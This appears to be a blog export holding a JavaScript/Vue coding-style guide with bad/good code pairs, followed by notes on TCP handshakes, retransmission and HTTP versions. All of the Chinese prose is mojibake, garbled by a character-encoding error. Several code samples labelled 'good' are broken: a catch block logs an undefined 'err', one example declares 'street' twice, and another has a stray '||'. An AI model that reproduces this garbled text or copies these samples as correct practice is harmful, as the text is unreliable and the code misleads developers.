åº”è¯¥ç›´æŽ¥å…‹éš†ä¸€ä¸ªæ–°å€¼è¿”å›žï¼Œè€Œä¸æ˜¯ç›´æŽ¥æ”¹å˜è¯¥å®ƒã€‚ 123456789// bad âŒfunction enrollStudentInCourse(course, student) &#123; course.push(&#123; student, enrollmentDate: Date.now() &#125;)&#125;//good âœ…function enrollStudentInCourse(course, student) &#123; return [...course, &#123; student, enrollmentDate: Date.now() &#125;]&#125; ä½¿ç”¨éžè´Ÿæ¡ä»¶1234567891011121314151617// bad âŒfunction isUserNotVerified(user) &#123; // ...&#125;if (!isUserNotVerified(user)) &#123; // ...&#125;//good âœ…function isUserVerified(user) &#123; // ...&#125;if (isUserVerified(user)) &#123; // ...&#125; å°½å¯èƒ½ä½¿ç”¨ç®€å†™123456789101112131415161718192021// bad âŒif (isActive === true) &#123; // ...&#125;if (firstName !== '' &amp;&amp; firstName !== null &amp;&amp; firstName !== undefined) &#123; // ...&#125;const isUserEligible = user.isVerified() &amp;&amp; user.didSubscribe() ? true : false//good âœ…if (isActive) &#123; // ...&#125;if (!!firstName) &#123; // ...&#125;const isUserEligible = user.isVerified() &amp;&amp; user.didSubscribe() é¿å…è¿‡å¤šåˆ†æ”¯å°½æ—© return ä¼šä½¿ä½ çš„ä»£ç çº¿æ€§åŒ–ã€æ›´å…·å¯è¯»æ€§ä¸”ä¸é‚£ä¹ˆå¤æ‚ã€‚ 12345678910111213141516171819202122232425// bad âŒfunction addUserService(db, user) &#123; if (!db) &#123; if (!db.isConnected()) &#123; if (!user) &#123; return db.insert('users', user) &#125; else &#123; throw new Error('No user') &#125; &#125; else &#123; throw new Error('No database connection') &#125; &#125; else &#123; throw new Error('No database') &#125;&#125;//good âœ…function addUserService(db, user) &#123; if (!db) throw new Error('No database') if (!db.isConnected()) throw new Error('No database connection') if (!user) throw new Error('No user') return db.insert('users', user)&#125; ä¼˜å…ˆä½¿ç”¨ map è€Œä¸æ˜¯ switch è¯­å¥æ—¢èƒ½å‡å°‘å¤æ‚åº¦åˆèƒ½æå‡æ€§èƒ½ã€‚ 123456789101112131415161718192021222324// bad âŒconst getColorByStatus = (status) =&gt; &#123; switch (status) &#123; case 'success': return 'green' case 'failure': return 'red' case 'warning': return 'yellow' case 'loading': default: return 'blue' &#125;&#125;//good âœ…const statusColors = &#123; success: 'green', failure: 'red', warning: 'yellow', loading: 'blue'&#125;const getColorByStatus = (status) =&gt; statusColors[status] || 'blue' ä½¿ç”¨å¯é€‰é“¾æŽ¥123456789101112131415161718192021const user = &#123; email: 'JDoe@example.com', billing: &#123; iban: '...', swift: '...', address: &#123; street: 'Some Street Name', state: 'CA' &#125; &#125;&#125;// bad âŒconst email = (user &amp;&amp; user.email) || 'N/A'const street = (user &amp;&amp; user.billing &amp;&amp; user.billing.address &amp;&amp; user.billing.address.street) || 'N/A'const state = (user &amp;&amp; user.billing &amp;&amp; user.billing.address &amp;&amp; user.billing.address.state) || 'N/A'//good âœ…const email = user?.email ?? 'N/A'const street = user?.billing?.address?.street ?? 'N/A'const street = user?.billing?.address?.state ?? 'N/A' é¿å…å›žè°ƒå›žè°ƒå¾ˆæ··ä¹±ï¼Œä¼šå¯¼è‡´ä»£ç åµŒå¥—è¿‡æ·±ï¼Œä½¿ç”¨ Promise æ›¿ä»£å›žè°ƒã€‚ 12345678910111213141516171819202122232425262728293031323334// bad âŒgetUser(function (err, user) &#123; getProfile(user, function (err, profile) &#123; getAccount(profile, function (err, account) &#123; getReports(account, function (err, reports) &#123; sendStatistics(reports, function (err) &#123; console.error(err) &#125;) &#125;) &#125;) &#125;)&#125;)//good âœ…getUser() .then(getProfile) .then(getAccount) .then(getReports) .then(sendStatistics) .catch((err) =&gt; console.error(err))// or using Async/Await âœ…âœ…async function sendUserStatistics() &#123; try &#123; const user = await getUser() const profile = await getProfile(user) const account = await getAccount(profile) const reports = await getReports(account) return sendStatistics(reports) &#125; catch (e) &#123; console.error(err) &#125;&#125; å¤„ç†æŠ›å‡ºçš„é”™è¯¯å’Œ reject çš„ promise123456789101112131415161718192021222324// bad âŒtry &#123; // Possible erronous code&#125; catch (e) &#123; console.log(e)&#125;//good âœ…try &#123; // Possible erronous code&#125; catch (e) &#123; // Follow the most applicable (or all): // 1- More suitable than console.log console.error(e) // 2- Notify user if applicable alertUserOfError(e) // 3- Report to server reportErrorToServer(e) // 4- Use a custom error handler throw new CustomError(e)&#125; åªæ³¨é‡Šä¸šåŠ¡é€»è¾‘1234567891011121314151617181920212223242526272829303132333435363738394041// bad âŒfunction generateHash(str) &#123; // Hash variable let hash = 0 // Get the length of the string let length = str.length // If the string is empty return if (!length) &#123; return hash &#125; // Loop through every character in the string for (let i = 0; i &lt; length; i++) &#123; // Get character code. const char = str.charCodeAt(i) // Make the hash hash = (hash &lt;&lt; 5) - hash + char // Convert to 32-bit integer hash &amp;= hash &#125;&#125;// good âœ…function generateHash(str) &#123; let hash = 0 let length = str.length if (!length) &#123; return hash &#125; for (let i = 0; i &lt; length; i++) &#123; const char = str.charCodeAt(i) hash = (hash &lt;&lt; 5) - hash + char hash = hash &amp; hash // Convert to 32bit integer &#125; return hash&#125; ES6 ä¼˜åŒ–åŽŸç”Ÿ JSï¼ˆES5ï¼‰ ä»£ç é£Žæ ¼ä½¿ç”¨é»˜è®¤å‚æ•°12345678910// bad âŒfunction printAllFilesInDirectory(dir) &#123; const directory = dir || './' // ...&#125;// good âœ…function printAllFilesInDirectory(dir = './') &#123; // ...&#125; å¯¹è±¡ç»“æž„å–å€¼12345678910111213141516const obj = &#123; a: 1, b: 2, c: 3, d: 4, e: 5&#125;// bad âŒconst f = obj.a + obj.dconst g = obj.c + obj.e// good âœ…const &#123; a, b, c, d, e &#125; = objconst f = a + dconst g = c + e ES6 çš„è§£æž„èµ‹å€¼è™½ç„¶å¥½ç”¨ã€‚ä½†æ˜¯è¦æ³¨æ„è§£æž„çš„å¯¹è±¡ä¸èƒ½ä¸º undefinedã€nullã€‚å¦åˆ™ä¼šæŠ¥é”™ï¼Œæ•…è¦ç»™è¢«è§£æž„çš„å¯¹è±¡ä¸€ä¸ªé»˜è®¤å€¼ã€‚ 1const &#123; a, b, c, d, e &#125; = obj || &#123;&#125; æ‹“å±•è¿ç®—ç¬¦åˆå¹¶æ•°æ®åˆå¹¶æ•°ç»„æˆ–è€…å¯¹è±¡ï¼Œç”¨ ES5 çš„å†™æ³•æœ‰äº›å†—ä½™ 12345678910111213141516const a = [1, 2, 3]const b = [1, 5, 6]const obj1 = &#123; a: 1&#125;const obj2 = &#123; b: 1&#125;// bad âŒconst c = a.concat(b) //[1,2,3,1,5,6]const obj = Object.assign(&#123;&#125;, obj1, obj2) // &#123;a:1, b:1&#125;// good âœ…const c = [...new Set([...a, ...b])] //[1,2,3,5,6]const obj = &#123; ...obj1, ...obj2 &#125; // &#123;a:1, b:1&#125; æ‹¼æŽ¥å­—ç¬¦12345678910111213const name = 'å°æ˜Ž'const score = 59// bad âŒlet result = ''if (score &gt; 60) &#123; result = `$&#123;name&#125;çš„è€ƒè¯•æˆç»©åŠæ ¼`&#125; else &#123; result = `$&#123;name&#125;çš„è€ƒè¯•æˆç»©ä¸åŠæ ¼`&#125;// good âœ…const result = `$&#123;name&#125;$&#123;score &gt; 60 ? 'çš„è€ƒè¯•æˆç»©åŠæ ¼' : 'çš„è€ƒè¯•æˆç»©ä¸åŠæ ¼'&#125;` includes æ›¿ä»£å¤šæ¡ä»¶åˆ¤æ–­12345678910111213141516// bad âŒf( type == 1 || type == 2 || type == 3 || type == 4 ||)&#123; //...&#125;// good âœ…const condition = [1,2,3,4];if( condition.includes(type) )&#123; //...&#125; åˆ—è¡¨æŸ¥æ‰¾æŸä¸€é¡¹1234567891011const a = [1, 2, 3, 4, 5]// bad âŒconst result = a.filter((item) =&gt; &#123; return item === 3&#125;)// good âœ…const result = a.find((item) =&gt; &#123; return item === 3&#125;) æ•°ç»„æ‰å¹³åŒ–123456789101112131415161718// bad âŒconst deps = &#123; é‡‡è´­éƒ¨: [1, 2, 3], äººäº‹éƒ¨: [5, 8, 12], è¡Œæ”¿éƒ¨: [5, 14, 79], è¿è¾“éƒ¨: [3, 64, 105]&#125;let member = []for (let item in deps) &#123; const value = deps[item] if (Array.isArray(value)) &#123; member = [...member, ...value] &#125;&#125;member = [...new Set(member)]// good âœ…const member = Object.values(deps).flat(Infinity) å¯é€‰é“¾æ“ä½œç¬¦èŽ·å–å¯¹è±¡å±žæ€§å€¼12345// bad âŒconst name = obj &amp;&amp; obj.name// good âœ…const name = obj?.name åŠ¨æ€å¯¹è±¡å±žæ€§å12345678// bad âŒlet obj = &#123;&#125;let index = 1let key = `topic$&#123;index&#125;`obj[key] = 'è¯é¢˜å†…å®¹'// good âœ…obj[`topic$&#123;index&#125;`] = 'è¯é¢˜å†…å®¹' åˆ¤æ–­éžç©º123456789// bad âŒif (value !== null &amp;&amp; value !== undefined &amp;&amp; value !== '') &#123; //...&#125;// good âœ…if ((value ?? '') !== '') &#123; //...&#125; Vue ç»„ä»¶é£Žæ ¼Vue å•æ–‡ä»¶ç»„ä»¶é£Žæ ¼æŒ‡å—å†…å®¹èŠ‚é€‰è‡ª Vue å®˜æ–¹é£Žæ ¼æŒ‡å—ã€‚ ç»„ä»¶æ•°æ®ç»„ä»¶çš„ data å¿…é¡»æ˜¯ä¸€ä¸ªå‡½æ•°ã€‚ 123456789101112131415// badexport default &#123; data: &#123; foo: 'bar' &#125;&#125;;// goodexport default &#123; data() &#123; return &#123; foo: 'bar' &#125;; &#125;&#125;; å•æ–‡ä»¶ç»„ä»¶æ–‡ä»¶åç§°å•æ–‡ä»¶ç»„ä»¶çš„æ–‡ä»¶ååº”è¯¥è¦ä¹ˆå§‹ç»ˆæ˜¯å•è¯å¤§å†™å¼€å¤´ (PascalCase)ï¼Œè¦ä¹ˆå§‹ç»ˆæ˜¯æ¨ªçº¿è¿žæŽ¥ (kebab-case)ã€‚ 1234567// badmycomponent.vuemyComponent.vue// goodmy - component.vueMyComponent.vue ç´§å¯†è€¦åˆçš„ç»„ä»¶åå’Œçˆ¶ç»„ä»¶ç´§å¯†è€¦åˆçš„å­ç»„ä»¶åº”è¯¥ä»¥çˆ¶ç»„ä»¶åä½œä¸ºå‰ç¼€å‘½åã€‚ 1234567891011// badcomponents/|- TodoList.vue|- TodoItem.vueâ””â”€ TodoButton.vue// goodcomponents/|- TodoList.vue|- TodoListItem.vueâ””â”€ TodoListItemButton.vue è‡ªé—­åˆç»„ä»¶åœ¨å•æ–‡ä»¶ç»„ä»¶ä¸­æ²¡æœ‰å†…å®¹çš„ç»„ä»¶åº”è¯¥æ˜¯è‡ªé—­åˆçš„ã€‚ 12345&lt;!-- bad --&gt;&lt;my-component&gt;&lt;/my-component&gt;&lt;!-- good --&gt;&lt;my-component /&gt; Prop åå¤§å°å†™åœ¨å£°æ˜Ž prop çš„æ—¶å€™ï¼Œå…¶å‘½ååº”è¯¥å§‹ç»ˆä½¿ç”¨ camelCaseï¼Œè€Œåœ¨æ¨¡æ¿ä¸­åº”è¯¥å§‹ç»ˆä½¿ç”¨ kebab-caseã€‚ 12345678910111213// badexport default &#123; props: &#123; 'greeting-text': String &#125;&#125;;// goodexport default &#123; props: &#123; greetingText: String &#125;&#125;; 12345&lt;!-- bad --&gt;&lt;welcome-message greetingText="hi" /&gt;&lt;!-- good --&gt;&lt;welcome-message greeting-text="hi" /&gt; æŒ‡ä»¤ç¼©å†™æŒ‡ä»¤ç¼©å†™ï¼Œç”¨ : è¡¨ç¤º v-bind: ï¼Œç”¨ @ è¡¨ç¤º v-on: 12345&lt;!-- bad --&gt;&lt;input v-bind:value="value" v-on:input="onInput" /&gt;&lt;!-- good --&gt;&lt;input :value="value" @input="onInput" /&gt; Props é¡ºåºæ ‡ç­¾çš„ Props åº”è¯¥æœ‰ç»Ÿä¸€çš„é¡ºåºï¼Œä¾æ¬¡ä¸ºæŒ‡ä»¤ã€å±žæ€§å’Œäº‹ä»¶ã€‚ 12345678910&lt;my-component v-if="if" v-show="show" v-model="value" ref="ref" :key="key" :text="text" @input="onInput" @change="onChange"/&gt; ç»„ä»¶é€‰é¡¹çš„é¡ºåºç»„ä»¶é€‰é¡¹åº”è¯¥æœ‰ç»Ÿä¸€çš„é¡ºåºã€‚ 12345678910111213141516171819202122232425export default &#123; name: '', components: &#123;&#125;, props: &#123;&#125;, emits: [], setup() &#123;&#125;, data() &#123;&#125;, computed: &#123;&#125;, watch: &#123;&#125;, created() &#123;&#125;, mounted() &#123;&#125;, unmounted() &#123;&#125;, methods: &#123;&#125;&#125; ç»„ä»¶é€‰é¡¹ä¸­çš„ç©ºè¡Œç»„ä»¶é€‰é¡¹è¾ƒå¤šæ—¶ï¼Œå»ºè®®åœ¨å±žæ€§ä¹‹é—´æ·»åŠ ç©ºè¡Œã€‚ 123456789101112131415161718192021export default &#123; computed: &#123; formattedValue() &#123; // ... &#125;, styles() &#123; // ... &#125; &#125;, methods: &#123; onInput() &#123; // ... &#125;, onChange() &#123; // ... &#125; &#125;&#125; å•æ–‡ä»¶ç»„ä»¶é¡¶çº§æ ‡ç­¾çš„é¡ºåºå•æ–‡ä»¶ç»„ä»¶åº”è¯¥æ€»æ˜¯è®©é¡¶çº§æ ‡ç­¾çš„é¡ºåºä¿æŒä¸€è‡´ï¼Œä¸”æ ‡ç­¾ä¹‹é—´ç•™æœ‰ç©ºè¡Œã€‚ 123456789&lt;template&gt; ... &lt;/template&gt;&lt;script&gt; /* ... */&lt;/script&gt;&lt;style&gt; /* ... */&lt;/style&gt;]]></content>
  </entry>
  <entry>
    <title><![CDATA[inter-http]]></title>
    <url>%2F2021%2F10%2F18%2Finter-http%2F</url>
    <content type="text"><![CDATA[ç½‘ç»œä¸ƒå±‚åè®®åº”ç”¨å±‚ã€è¡¨è¾¾å±‚ã€ä¼šè¯å±‚ã€ä¼ è¾“å±‚ã€ç½‘ç»œå±‚ã€æ•°æ®é“¾è·¯å±‚ã€ç‰©ç†å±‚ã€‚ å¦‚ä½•è®©ä½ è®¾è®¡ç½‘ç»œç‰©ç†å±‚ - é›†çº¿å™¨æ•°æ®é“¾è·¯å±‚ - äº¤æ¢æœºï¼Œç»´æŠ¤ ç«¯å£ - MAC åœ°å€è¡¨ç½‘ç»œå±‚ - è·¯ç”±å™¨ï¼Œå¯¹æ¯”æº IP å’Œç›®æ ‡ IP å­ç½‘æŽ©ç ï¼Œä¸åŒåˆ™èµ°é»˜è®¤è·¯ç”± TCP åè®®TCP é‡ä¼ ï¼šTCP é‡ä¼ æœºåˆ¶åŒ…æ‹¬ï¼š1ã€è¶…æ—¶é‡ä¼ ï¼Œ2ã€å¿«é€Ÿé‡ä¼ ï¼Œ3ã€SACKï¼Œ4ã€D-SACKã€‚è¶…æ—¶é‡ä¼ ï¼šæ•°æ®å‘é€æ—¶ï¼Œè®¾å®šä¸€ä¸ªå®šæ—¶å™¨ï¼Œå½“è¶…è¿‡æŒ‡å®šæ—¶é—´ï¼Œæ²¡æœ‰æ”¶åˆ°å¯¹æ–¹çš„ ack ç¡®è®¤åº”ç­”æŠ¥æ–‡ï¼Œå°±ä¼šé‡å‘è¯¥æ•°æ®ã€‚è¶…æ—¶é‡ä¼ æ—¶é—´ RTO åº”è¯¥ç•¥å¤§äºŽå¾€è¿”æ—¶å»¶ RTTï¼ˆæ•°æ®å‘é€åˆ°æŽ¥å—ç¡®è®¤çš„æ—¶åˆ»çš„å·®å€¼ï¼‰ã€‚å¿«é€Ÿé‡ä¼ ï¼šæ”¶åˆ°ä¸‰ä¸ªç›¸åŒçš„ ack æŠ¥æ–‡æ—¶ï¼Œä¼šåœ¨å®šæ—¶å™¨è¿‡æœŸä¹‹å‰ï¼Œé‡ä¼ ä¸¢å¤±çš„æŠ¥æ–‡æ®µã€‚SACKï¼šTCP å¤´éƒ¨ SACK å­—æ®µï¼Œç¼“å­˜åœ°å›¾å‘é€ç»™å‘é€æ–¹ï¼ŒçŸ¥é“å‘é€æ–¹é‚£äº›æ•°æ®æ”¶åˆ°äº†ï¼Œå“ªäº›æ²¡æœ‰æ”¶åˆ°ã€‚D-SACkï¼šä½¿ç”¨ SACK å‘Šè¯‰å‘é€æ–¹å“ªäº›æ•°æ®è¢«é‡å¤æŽ¥æ”¶äº†ã€‚ TCP é‡ä¼ ã€çª—å£æ»‘åŠ¨ã€æµé‡æŽ§åˆ¶å’Œæ‹¥å¡žæŽ§åˆ¶ æ²¡æƒ³åˆ° TCP å±…ç„¶è¿˜æœ‰è¿™ç§æ‰“å¼€æ–¹å¼ ä¼ è¾“å±‚ - UDPï¼Œå¢žåŠ æºç«¯å£å·å’Œç›®æ ‡ç«¯å£å· TCP çª—å£æµé‡æŽ§åˆ¶ï¼š A -&gt; B å‘é€ TCP æ¶ˆæ¯ä¼šå¸¦ä¸Š winï¼Œwin æ˜¯çª—å£å¤§å°ï¼Œè¡¨ç¤º A çš„æŽ¥å—èƒ½åŠ›ï¼ŒB æ”¶åˆ°åŽä¼šå›žå¤ ack å’Œ winï¼Œè¡¨ç¤º B çš„æŽ¥æ”¶èƒ½åŠ›ï¼› å¦‚æžœä¸¤ä¸ª win å¤§å°ç›¸åŒï¼ŒA æ¯æ”¶åˆ°ä¸€ä¸ª ack åŽçª—å£æ•´ä½“ç§»åŠ¨ä¸€æ­¥ï¼› å¦‚æžœé•¿åº¦ä¸åŒï¼ŒB å‘ç»™ A çš„ win å˜å¤§ï¼Œè¯æ˜Ž B çš„æŽ¥å—èƒ½åŠ›å˜å¼ºï¼ŒA çš„çª—å£ä¸Šè¾¹ç•Œå¾€å³è¾¹ç§»åŠ¨ï¼Œæ‰©å¤§å‘é€çª—å£ï¼› B å‘ç»™ A çš„ win å˜å°ï¼Œè¯æ˜Ž B çš„æŽ¥å—èƒ½åŠ›å˜å¼±ï¼ŒA çš„çª—å£ä¸Šè¾¹ç•Œä¸åŠ¨ï¼Œç­‰æŽ¥å—åˆ° ack åŽä¸‹è¾¹ç•Œå³ç§»å³å¯ï¼Œçª—å£å¤§å°å˜ä¸º win çš„é•¿åº¦ï¼Œå†æ•´ä½“ç§»åŠ¨ï¼› win å€¼æ˜¯é€šè¿‡è¯•æŽ¢ç®—å‡ºæ¥çš„ï¼Œæ¯”å¦‚ç¬¬ä¸€æ¬¡å‘é€ 2 ä¸ªï¼Œç¬¬äºŒæ¬¡å‘é€ 3 ä¸ªâ€¦ï¼› TCP åè®®ä¸‰æ¬¡æ¡æ‰‹1ã€ç¬¬ä¸€æ¬¡æ¡æ‰‹ï¼šåˆšå¼€å§‹å®¢æˆ·ç«¯å¤„äºŽ CLOSED çš„çŠ¶æ€ï¼ŒæœåŠ¡ç«¯å¤„äºŽ LISTEN çŠ¶æ€ã€‚å®¢æˆ·ç«¯ç»™æœåŠ¡ç«¯å‘ä¸€ä¸ª SYN æŠ¥æ–‡ï¼Œå¹¶æŒ‡æ˜Žå®¢æˆ·ç«¯çš„åˆå§‹åŒ–åºåˆ—å· ISNã€‚æ­¤æ—¶å®¢æˆ·ç«¯å¤„äºŽ SYN_SEND çŠ¶æ€ã€‚2ã€ç¬¬äºŒæ¬¡æ¡æ‰‹ï¼šæœåŠ¡å™¨æ”¶åˆ°å®¢æˆ·ç«¯çš„ SYN æŠ¥æ–‡ä¹‹åŽï¼Œä¼šä»¥è‡ªå·±çš„ SYN æŠ¥æ–‡ä½œä¸ºåº”ç­”ï¼Œå¹¶ä¸”ä¹Ÿæ˜¯æŒ‡å®šäº†è‡ªå·±çš„åˆå§‹åŒ–åºåˆ—å· ISNï¼ŒåŒæ—¶ä¼šæŠŠå®¢æˆ·ç«¯çš„ ISN + 1 ä½œä¸º ACK çš„å€¼ï¼Œè¡¨ç¤ºè‡ªå·±å·²ç»æ”¶åˆ°äº†å®¢æˆ·ç«¯çš„ SYNï¼Œæ­¤æ—¶æœåŠ¡å™¨å¤„äºŽ SYN_REVD çš„çŠ¶æ€ã€‚3ã€ç¬¬ä¸‰æ¬¡æ¡æ‰‹ï¼šå®¢æˆ·ç«¯æ”¶åˆ° SYN æŠ¥æ–‡ä¹‹åŽï¼Œä¼šå‘é€ä¸€ä¸ª ACK æŠ¥æ–‡ï¼Œå½“ç„¶ï¼Œä¹Ÿæ˜¯ä¸€æ ·æŠŠæœåŠ¡å™¨çš„ ISN + 1 ä½œä¸º ACK çš„å€¼ï¼Œè¡¨ç¤ºå·²ç»æ”¶åˆ°äº†æœåŠ¡ç«¯çš„ SYN æŠ¥æ–‡ï¼Œæ­¤æ—¶å®¢æˆ·ç«¯å¤„äºŽ ESTABLELISHED çŠ¶æ€ã€‚4ã€æœåŠ¡å™¨æ”¶åˆ° ACK æŠ¥æ–‡ä¹‹åŽï¼Œä¹Ÿå¤„äºŽ ESTABLELISHED çŠ¶æ€ï¼Œæ­¤æ—¶ï¼ŒåŒæ–¹ä»¥å»ºç«‹èµ·äº†é“¾æŽ¥ã€‚ ä¸ºä»€ä¹ˆæ˜¯ 3 æ¬¡ï¼Ÿé¿å…åŽ†å²è¿žæŽ¥ï¼Œç¡®è®¤å®¢æˆ·ç«¯å‘æ¥çš„è¯·æ±‚æ˜¯è¿™æ¬¡é€šä¿¡çš„äººã€‚ å››æ¬¡æŒ¥æ‰‹1ã€ç¬¬ä¸€æ¬¡æŒ¥æ‰‹ï¼šåœ¨æŒ¥æ‰‹ä¹‹å‰æœåŠ¡ç«¯ä¸Žå®¢æˆ·ç«¯éƒ½å¤„äºŽ ESTABLISTEN çŠ¶æ€ã€‚å®¢æˆ·ç«¯å‘é€ä¸€ä¸ª FIN æŠ¥æ–‡ï¼ŒæŠ¥æ–‡ä¸­ä¼šæŒ‡å®šä¸€ä¸ªåºåˆ—å·ã€‚æ­¤æ—¶å®¢æˆ·ç«¯å¤„äºŽ FIN_WAIT1 çŠ¶æ€ã€‚2ã€ç¬¬äºŒæ¬¡æŒ¥æ‰‹ï¼šæœåŠ¡ç«¯æ”¶åˆ° FIN ä¹‹åŽï¼Œä¼šå‘é€ ACK æŠ¥æ–‡ï¼Œä¸”æŠŠå®¢æˆ·ç«¯çš„åºåˆ—å·å€¼ + 1 ä½œä¸º ACK æŠ¥æ–‡çš„åºåˆ—å·å€¼ï¼Œè¡¨æ˜Žå·²ç»æ”¶åˆ°å®¢æˆ·ç«¯çš„æŠ¥æ–‡äº†ï¼Œæ­¤æ—¶æœåŠ¡ç«¯å¤„äºŽ CLOSE_WAIT çŠ¶æ€ã€‚3ã€ç¬¬ä¸‰æ¬¡æŒ¥æ‰‹ï¼šå¦‚æžœæœåŠ¡ç«¯ä¹Ÿæƒ³æ–­å¼€è¿žæŽ¥äº†ï¼Œå’Œå®¢æˆ·ç«¯çš„ç¬¬ä¸€æ¬¡æŒ¥æ‰‹ä¸€æ ·ï¼Œå‘ç»™ FIN æŠ¥æ–‡ï¼Œä¸”æŒ‡å®šä¸€ä¸ªåºåˆ—å·ã€‚æ­¤æ—¶æœåŠ¡ç«¯å¤„äºŽ LAST_ACK çš„çŠ¶æ€ã€‚4ã€ç¬¬å››æ¬¡æŒ¥æ‰‹ï¼šå®¢æˆ·ç«¯æ”¶åˆ° FIN ä¹‹åŽï¼Œä¸€æ ·å‘é€ä¸€ä¸ª ACK æŠ¥æ–‡ä½œä¸ºåº”ç­”ï¼Œä¸”æŠŠæœåŠ¡ç«¯çš„åºåˆ—å·å€¼ + 1 ä½œä¸ºè‡ªå·± ACK æŠ¥æ–‡çš„åºåˆ—å·å€¼ï¼Œæ­¤æ—¶å®¢æˆ·ç«¯å¤„äºŽ TIME_WAIT çŠ¶æ€ã€‚éœ€è¦è¿‡ä¸€é˜µå­ä»¥ç¡®ä¿æœåŠ¡ç«¯æ”¶åˆ°è‡ªå·±çš„ ACK æŠ¥æ–‡ä¹‹åŽæ‰ä¼šè¿›å…¥ CLOSED çŠ¶æ€5ã€æœåŠ¡ç«¯æ”¶åˆ° ACK æŠ¥æ–‡ä¹‹åŽï¼Œå°±å¤„äºŽå…³é—­è¿žæŽ¥äº†ï¼Œå¤„äºŽ CLOSED çŠ¶æ€ã€‚ å‚è€ƒï¼šå…³äºŽä¸‰æ¬¡æ¡æ‰‹å’Œå››æ¬¡æŒ¥æ‰‹ï¼Œé¢è¯•å®˜æƒ³å¬åˆ°æ€Žæ ·çš„å›žç­”ï¼Ÿ HTTP/1.0 HTTP1.1 HTTP2.0 ç‰ˆæœ¬ä¹‹é—´çš„å·®å¼‚HTTP 0.9 1991 å¹´,åŽŸåž‹ç‰ˆæœ¬ï¼ŒåŠŸèƒ½ç®€é™‹ï¼Œåªæœ‰ä¸€ä¸ªå‘½ä»¤ GET,åªæ”¯æŒçº¯æ–‡æœ¬å†…å®¹ï¼Œè¯¥ç‰ˆæœ¬å·²è¿‡æ—¶ã€‚ HTTP1.0 ä»»ä½•æ ¼å¼çš„å†…å®¹éƒ½å¯ä»¥å‘é€ï¼Œè¿™ä½¿å¾—äº’è”ç½‘ä¸ä»…å¯ä»¥ä¼ è¾“æ–‡å­—ï¼Œè¿˜èƒ½ä¼ è¾“å›¾åƒã€è§†é¢‘ã€äºŒè¿›åˆ¶ç­‰æ–‡ä»¶ã€‚ é™¤äº† GET å‘½ä»¤ï¼Œè¿˜å¼•å…¥äº† POST å‘½ä»¤å’Œ HEAD å‘½ä»¤ã€‚ http è¯·æ±‚å’Œå›žåº”çš„æ ¼å¼æ”¹å˜ï¼Œé™¤äº†æ•°æ®éƒ¨åˆ†ï¼Œæ¯æ¬¡é€šä¿¡éƒ½å¿…é¡»åŒ…æ‹¬å¤´ä¿¡æ¯ï¼ˆHTTP headerï¼‰ï¼Œç”¨æ¥æè¿°ä¸€äº›å…ƒæ•°æ®ã€‚ åªä½¿ç”¨ header ä¸­çš„ If-Modified-Since å’Œ Expires ä½œä¸ºç¼“å­˜å¤±æ•ˆçš„æ ‡å‡†ã€‚ ä¸æ”¯æŒæ–­ç‚¹ç»­ä¼ ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ¯æ¬¡éƒ½ä¼šä¼ é€å…¨éƒ¨çš„é¡µé¢å’Œæ•°æ®ã€‚ é€šå¸¸æ¯å°è®¡ç®—æœºåªèƒ½ç»‘å®šä¸€ä¸ª IPï¼Œæ‰€ä»¥è¯·æ±‚æ¶ˆæ¯ä¸­çš„ URL å¹¶æ²¡æœ‰ä¼ é€’ä¸»æœºåï¼ˆhostnameï¼‰ HTTP 1.1http1.1 æ˜¯ç›®å‰æœ€ä¸ºä¸»æµçš„ http åè®®ç‰ˆæœ¬ï¼Œä»Ž 1999 å¹´å‘å¸ƒè‡³ä»Šï¼Œä»æ˜¯ä¸»æµçš„ http åè®®ç‰ˆæœ¬ã€‚ å¼•å…¥äº†æŒä¹…è¿žæŽ¥ï¼ˆ persistent connectionï¼‰ï¼Œå³ TCP è¿žæŽ¥é»˜è®¤ä¸å…³é—­ï¼Œå¯ä»¥è¢«å¤šä¸ªè¯·æ±‚å¤ç”¨ï¼Œä¸ç”¨å£°æ˜Ž Connection: keep-aliveã€‚é•¿è¿žæŽ¥çš„è¿žæŽ¥æ—¶é•¿å¯ä»¥é€šè¿‡è¯·æ±‚å¤´ä¸­çš„ keep-alive æ¥è®¾ç½®ã€‚ å¼•å…¥äº†ç®¡é“æœºåˆ¶ï¼ˆ pipeliningï¼‰ï¼Œå³åœ¨åŒä¸€ä¸ª TCP è¿žæŽ¥é‡Œï¼Œå®¢æˆ·ç«¯å¯ä»¥åŒæ—¶å‘é€å¤šä¸ªè¯·æ±‚ï¼Œè¿›ä¸€æ­¥æ”¹è¿›äº† HTTP åè®®çš„æ•ˆçŽ‡ã€‚ HTTP 1.1 ä¸­æ–°å¢žåŠ äº† E-tagï¼ŒIf-Unmodified-Since, If-Match, If-None-Match ç­‰ç¼“å­˜æŽ§åˆ¶æ ‡å¤´æ¥æŽ§åˆ¶ç¼“å­˜å¤±æ•ˆã€‚ æ”¯æŒæ–­ç‚¹ç»­ä¼ ï¼Œé€šè¿‡ä½¿ç”¨è¯·æ±‚å¤´ä¸­çš„ Range æ¥å®žçŽ°ã€‚ ä½¿ç”¨äº†è™šæ‹Ÿç½‘ç»œï¼Œåœ¨ä¸€å°ç‰©ç†æœåŠ¡å™¨ä¸Šå¯ä»¥å­˜åœ¨å¤šä¸ªè™šæ‹Ÿä¸»æœºï¼ˆMulti-homed Web Serversï¼‰ï¼Œå¹¶ä¸”å®ƒä»¬å…±äº«ä¸€ä¸ª IP åœ°å€ã€‚ æ–°å¢žæ–¹æ³•ï¼šPUTã€ PATCHã€ OPTIONSã€ DELETEã€‚ http1.x ç‰ˆæœ¬é—®é¢˜ åœ¨ä¼ è¾“æ•°æ®è¿‡ç¨‹ä¸­ï¼Œæ‰€æœ‰å†…å®¹éƒ½æ˜¯æ˜Žæ–‡ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯éƒ½æ— æ³•éªŒè¯å¯¹æ–¹çš„èº«ä»½ï¼Œæ— æ³•ä¿è¯æ•°æ®çš„å®‰å…¨æ€§ã€‚ HTTP/1.1 ç‰ˆæœ¬é»˜è®¤å…è®¸å¤ç”¨ TCP è¿žæŽ¥ï¼Œä½†æ˜¯åœ¨åŒä¸€ä¸ª TCP è¿žæŽ¥é‡Œï¼Œæ‰€æœ‰æ•°æ®é€šä¿¡æ˜¯æŒ‰æ¬¡åºè¿›è¡Œçš„ï¼ŒæœåŠ¡å™¨é€šå¸¸åœ¨å¤„ç†å®Œä¸€ä¸ªå›žåº”åŽï¼Œæ‰ä¼šç»§ç»­åŽ»å¤„ç†ä¸‹ä¸€ä¸ªï¼Œè¿™æ ·å­å°±ä¼šé€ æˆé˜Ÿå¤´é˜»å¡žã€‚ 